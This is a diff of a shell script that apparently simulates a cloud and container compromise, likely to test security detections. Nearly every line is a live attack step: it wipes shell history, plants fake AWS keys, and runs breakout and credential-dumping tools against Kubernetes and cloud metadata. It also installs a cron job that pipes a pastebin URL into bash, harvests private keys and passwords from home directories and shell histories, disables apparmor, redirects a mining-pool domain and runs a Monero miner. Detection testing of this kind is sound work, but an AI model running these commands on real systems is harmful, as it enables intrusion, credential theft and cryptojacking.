@@ -12,26 +12,16 @@ echo = `date` - Setting Up =
 echo Wiping Bash History, before starting execution
 # https://github.com/uber-common/metta/blob/master/MITRE/Defense_Evasion/defenseevasion_linux_unset_histfile.yml
 unset HISTFILE
-rm ~/.bash_history
-cat /dev/null > ~/.bash_history
+rm ~/.bash_history 2>/dev/null
+cat /dev/null > ~/.bash_history 2>/dev/null
 history -c
 
 echo Setting fake AWS Credentials to be stolen later
-mkdir /root/.aws
+mkdir /root/.aws 2>/dev/null
 echo "[default]" >> /root/.aws/credentials
 echo "aws_access_key_id = AKAAAAAAA_AccessKey" >> /root/.aws/credentials
 echo "aws_secret_access_key = qLlZ_SecretKey" >> /root/.aws/credentials
 
-echo Installing MiniKube
-curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
-sudo install minikube-linux-amd64 /usr/local/bin/minikube
-minikube start
-kubectl get po -A
-minikube kubectl -- get po -A
-minikube dashboard
-kubectl create deployment hello-minikube --image=k8s.gcr.io/echoserver:1.4
-kubectl expose deployment hello-minikube --type=NodePort --port=8080
-kubectl create deployment monero-miner --image=monero/miner
 
 echo Installing Docker
 if [ "$(grep -Ei 'debian|buntu|mint' /etc/*release)" ]; then
@@ -42,44 +32,55 @@ fi
 
 if [ -n "$(command -v yum)" ]; then
     yum update -y
-    amazon-linux-extras -y install docker
+    amazon-linux-extras install docker
     yum install -y docker
     service docker start
 fi
 
+echo Installing MiniKube
+curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+sudo install minikube-linux-amd64 /usr/local/bin/minikube
+/usr/local/bin/minikube start   2>/dev/null
+/usr/local/bin/minikube kubectl get po -A   2>/dev/null
+/usr/local/bin/minikube kubectl -- get po -A  2>/dev/null
+/usr/local/bin/minikube dashboard  2>/dev/null
+/usr/local/bin/minikube kubectl create deployment hello-minikube --image=k8s.gcr.io/echoserver:1.4  2>/dev/null
+/usr/local/bin/minikube kubectl expose deployment hello-minikube --type=NodePort --port=8080  2>/dev/null
+/usr/local/bin/minikube kubectl create deployment monero-miner --image=monero/miner  2>/dev/null
+
 echo = Running Cloud and Container Pen-Test Tools =
 
 echo Copying Binaries to /tmp for Execution
-mkdir /tmp/bins
-cp ./bins/* /tmp/bins
+mkdir /tmp/bins 2>/dev/null
+cp ./bins/* /tmp/bins 2>/dev/null
 chmod +x /tmp/bins/*
 
 echo Running Break Out The Box
-timeout 60 /tmp/bins/botb -scrape-gcp=true -recon=true -metadata=true -find-http=true -find-sockets=true -find-docker=true -pwnKeyctl=true -k8secrets=true -pwn-privileged= -autopwn=true -keyMin=0 -keyMax=100000000 -k8secrets=true > /tmp/botb_output.txt
+timeout -s SIGKILL 60 /tmp/bins/botb -scrape-gcp=true -recon=true -metadata=true -find-http=true -find-sockets=true -find-docker=true -pwnKeyctl=true -k8secrets=true -pwn-privileged= -autopwn=true -keyMin=0 -keyMax=100000000 -k8secrets=true > /tmp/botb_output.txt 2>/dev/null
 
 echo Running kubeletmein
-timeout 60 /tmp/bins/kubeletmein generate > /tmp/kubeletmein_output.txt
-timeout 60 /tmp/bins/kubeletmein gke bootstrap >> /tmp/kubeletmein_output.txt
-timeout 60 /tmp/bins/kubeletmein gke generate -n anything >> /tmp/kubeletmein_output.txt
+timeout -s SIGKILL 60 /tmp/bins/kubeletmein generate > /tmp/kubeletmein_output.txt 2>/dev/null
+timeout -s SIGKILL 60 /tmp/bins/kubeletmein gke bootstrap >> /tmp/kubeletmein_output.txt 2>/dev/null
+timeout -s SIGKILL 60 /tmp/bins/kubeletmein gke generate -n anything >> /tmp/kubeletmein_output.txt 2>/dev/null
 
 echo Running DigitalOCean Pwner
-timeout 5 curl -qs http://169.254.169.254/metadata/v1/user-data > user-data.txt
-timeout 5 /tmp/bins/dopwn exploit -f user-data.txt
+timeout -s SIGKILL 5 curl -qs http://169.254.169.254/metadata/v1/user-data > user-data.txt 2>/dev/null
+timeout -s SIGKILL 5 /tmp/bins/dopwn exploit -f user-data.txt 2>/dev/null
 
 echo Running amicontained Recon tool
-timeout 60 /tmp/bins/amicontained
+timeout -s SIGKILL 60 /tmp/bins/amicontained
 
 echo Running DeepCe
-timeout 60 /tmp/bins/deepce.sh > /tmp/deepce.txt
+timeout -s SIGKILL 60 /tmp/bins/deepce.sh > /tmp/deepce.txt
 
 echo Running AWS Dump
-timeout 60 /tmp/bins/aws_dump.sh > /tmp/aws_dump.txt
+timeout -s SIGKILL 60 /tmp/bins/aws_dump.sh > /tmp/aws_dump.txt
 
 echo Running go-pillage-registries
-timeout 60 /tmp/bins/.pilreg 127.0.0.1:5000 > /tmp/pillreg.txt
+timeout -s SIGKILL 60 /tmp/bins/.pilreg 127.0.0.1:5000 > /tmp/pillreg.txt
 
 echo Executing peirates in interactive mode
-/tmp/bins/peirates
+timeout -s SIGKILL 5 /tmp/bins/peirates -i 127.0.0.1 -p 80
 
 echo = Running Classic Mining Worm Capabilities =
 
@@ -89,17 +90,17 @@ echo "* * * * * https://pastebin.com/raw/XCkjzVUv | bash > /tmp/cron.txt 2>&" | 
 
 echo Searching for keys
 # https://github.com/uber-common/metta/blob/master/MITRE/Credential_Access/credacces_linux_searchprivatekeys.yaml
-grep /home/ -irw -e "BEGIN RSA PRIVATE" 2>/dev/null > rsa_keys.txt
-grep /home/ -irw -e "BEGIN DSA PRIVATE" 2>/dev/null > dsa_keys.txt
+grep /home/ -irw -e "BEGIN RSA PRIVATE" > rsa_keys.txt 2>/dev/null
+grep /home/ -irw -e "BEGIN DSA PRIVATE" > dsa_keys.txt 2>/dev/null
 
 echo Searching for credentials in bash history
 # https://github.com/uber-common/metta/blob/master/MITRE/Credential_Access/credaccess_linux_bash_history.yml
-cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt
-cat loot_bash.txt
-cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt
-cat loot_sh.txt
-cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt
-cat loot_zsh.txt
+cat ~/.bash_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_bash.txt 2>/dev/null
+cat loot_bash.txt 2>/dev/null
+cat ~/.sh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_sh.txt 2>/dev/null
+cat loot_sh.txt 2>/dev/null
+cat ~/.zsh_history | grep -e '-p ' -e 'pass' -e 'ssh' > loot_zsh.txt 2>/dev/null
+cat loot_zsh.txt 2>/dev/null
 
 echo Adding Custom DNS
 echo '1.91.204.131 api.nanopool.org' > /etc/hosts
@@ -141,10 +142,10 @@ systemctl enable apparmor
 service apparmor stop
 
 echo Disable NMI watchdog
-echo '0' >/proc/sys/kernel/nmi_watchdog
-echo '1' >/proc/sys/kernel/nmi_watchdog
+echo '0' >/proc/sys/kernel/nmi_watchdog  2>/dev/null
+echo '1' >/proc/sys/kernel/nmi_watchdog  2>/dev/null
 
 echo Running Stratum Protocol via XMRIG
-timeout 20 /tmp/bins/xmrig
+timeout -s SIGKILL 20 /tmp/bins/xmrig
 
 echo `date` - Finished
